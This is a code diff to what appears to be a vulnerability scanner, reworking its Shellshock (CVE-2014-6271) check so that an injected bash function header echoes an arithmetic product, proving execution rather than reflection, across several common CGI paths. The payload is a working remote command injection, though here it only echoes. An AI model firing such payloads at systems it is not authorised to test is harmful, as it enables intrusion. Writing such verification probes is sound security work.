@@ -182,13 +182,23 @@ async def _probe_apache_traversal(session: Any, base: str) -> Optional[VerifyRes
 async def _probe_shellshock(session: Any, base: str) -> Optional[VerifyResult]:
     """CVE-2014-6271 — Bash 'Shellshock' via a CGI environment variable.
 
-    Reflects a unique canary through a crafted header into a CGI script and
-    confirms only when the canary comes back in the body. The payload runs
-    ``echo`` of a random token — it neither writes nor deletes anything.
+    Injects a crafted ``() { :; };`` header whose trailing command echoes an
+    ARITHMETIC-EXPANSION marker, and confirms only when the computed PRODUCT
+    comes back in the body. The arithmetic is what makes this immune to a
+    header-reflection false positive: a CGI (for example the classic
+    ``test-cgi``) or an error page that merely echoes the raw User-Agent back
+    shows the LITERAL ``$((a*b))``, whereas a genuinely vulnerable bash runs the
+    echo and prints the product — so matching the product proves execution, not
+    reflection. The payload only echoes; it neither writes nor deletes anything.
+    (Same technique as ``exploit_engine.exploit_shellshock``.)
     """
-    token = "HVN" + secrets.token_hex(6)
-    payload = f"() {{ :;}}; echo; echo HVNSHOCK:{token}"
-    marker = f"HVNSHOCK:{token}"
+    a, b = secrets.randbelow(9000) + 1000, secrets.randbelow(9000) + 1000
+    rid = "HVN" + secrets.token_hex(5)
+    marker = f"{rid}{a * b}"
+    # Echo a CGI header + blank line first so a vulnerable Apache returns the
+    # script output (not a 500 "malformed header from script"), then the
+    # arithmetic marker whose PRODUCT only a real execution can print.
+    payload = f"() {{ :; }}; echo Content-type: text/plain; echo; echo {rid}$(({a}*{b}))"
     # Common CGI endpoints a default/legacy install exposes.
     endpoints = ["/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/test-cgi",
                  "/cgi-bin/", "/cgi-sys/defaultwebpage.cgi"]
@@ -200,16 +210,18 @@ async def _probe_shellshock(session: Any, base: str) -> Optional[VerifyResult]:
         if marker in body:
             return VerifyResult(
                 cve="", probed=True, proved=True, technique="shellshock_env_injection",
-                notes="CGI script executed an injected echo (Shellshock), confirmed.",
+                notes="CGI executed an injected arithmetic echo (Shellshock): the "
+                      "computed product, not the literal expression, came back, "
+                      "confirmed.",
                 evidence={
-                    "endpoint": ep, "canary": token, "response_status": status,
+                    "endpoint": ep, "canary": marker, "response_status": status,
                     "response_excerpt": body[:200],
                 },
             )
     return VerifyResult(
         cve="", probed=True, proved=False, technique="shellshock_env_injection",
-        notes="No reachable CGI endpoint reflected the canary (patched or no CGI) "
-              ", remains Potential.",
+        notes="No reachable CGI endpoint executed the injected marker (patched, "
+              "reflection-only, or no CGI), remains Potential.",
     )
 
 
